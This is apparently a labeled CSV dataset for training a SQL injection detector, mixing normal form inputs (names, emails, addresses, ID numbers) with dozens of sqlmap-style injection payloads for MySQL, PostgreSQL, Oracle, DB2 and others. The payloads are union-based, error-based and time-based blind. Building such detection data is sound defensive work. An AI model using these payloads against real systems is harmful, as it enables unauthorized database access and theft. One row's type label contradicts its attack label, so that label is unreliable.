Text,attack_type,Label,type
"-9565"" where 1616=1616 union all select 1616,1616,1616,1616--",sqli,1,sql
"1;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
1');select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1' where 8083=8083 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
haewon7,norm,0,normal
keng@glutenfreespain.lb,norm,0,normal
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""xwnw""=""xwnw",sqli,1,sql
9955615288852463,norm,0,normal
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('ykjs' like 'ykjs,sqli,1,sql
62183315d,norm,0,normal
4978848315399103,norm,0,normal
roderick,norm,0,normal
0353282720195441,norm,0,normal
-3582) where 5873=5873 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
"1)) as somz where 1598=1598;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
3467840384205414,norm,0,normal
34081266g,norm,0,normal
85amo,norm,0,normal
pons anguita,norm,0,normal
20914276p,norm,0,normal
octgona,norm,0,normal
basset ramos,norm,0,normal
"-4807' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'wwki'='wwki",sqli,1,sql
v$idr3ar,norm,0,normal
desparpajo,norm,0,normal
valverde de la virgen,norm,0,normal
10421521z,norm,0,normal
88684338h,norm,0,normal
fuente ezcurra,norm,0,normal
"1) where 5598=5598 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
5sp0luz64m3ent8,norm,0,normal
"1'||(select 'alxi' where 3967=3967 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,sql
48551498q,norm,0,normal
estrada perdig,norm,0,normal
"1"")) as ihfw where 3949=3949 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
1714795678341656,norm,0,normal
26213,norm,0,normal
byrska@diagnosticoradiologico.nz,norm,0,normal
6160253696929665,norm,0,normal
bisad,norm,0,normal
calle do fuso 19,norm,0,normal
7032,norm,0,normal
garv,norm,0,normal
"(select count(*) from generate_series(1,5000000))",sqli,1,sql
pagnol@tintaultravioleta.gob,norm,0,normal
garvn,norm,0,normal
a+ulagar,norm,0,normal
69393006m,norm,0,normal
koolwine,norm,0,normal
"-3852') union all select 3577,3577,3577,3577,3577,3577,3577,3577#",sqli,1,sql
18726543n,norm,0,normal
torreblanca pujades,norm,0,normal
"1"")) as uzvu where 2458=2458 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
1'));begin dbms_lock.sleep(5); end and (('eqoc' like 'eqoc,sqli,1,sql
miramon@logiteclines.rs,norm,0,normal
(select (case when (6783=6783) then 1 else 1/(select 0) end)),sqli,1,sql
"1 where 6881=6881 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
0052422482512057,norm,0,normal
"-7858') union all select 1541,1541,1541,1541,1541,1541#",sqli,1,sql
c/ sant gonal 166 9-b,norm,0,normal
l+echosa,norm,0,normal
1') or 6793=(select 6793 from pg_sleep(5)) and ('fupe'='fupe,sqli,1,sql
1287,norm,0,normal
-4557%')) or 4537=3401 and (('%'=',sqli,1,normal
1' in boolean mode);select pg_sleep(5)#,sqli,1,sql
anamary,norm,0,normal
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#",sqli,1,sql
96527161w,norm,0,normal
1' in boolean mode) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
31391,norm,0,normal
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1,sql
"once septiembre, 95",norm,0,normal
cosmo@vilainstal.sv,norm,0,normal
"1))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((4234=4234",sqli,1,sql
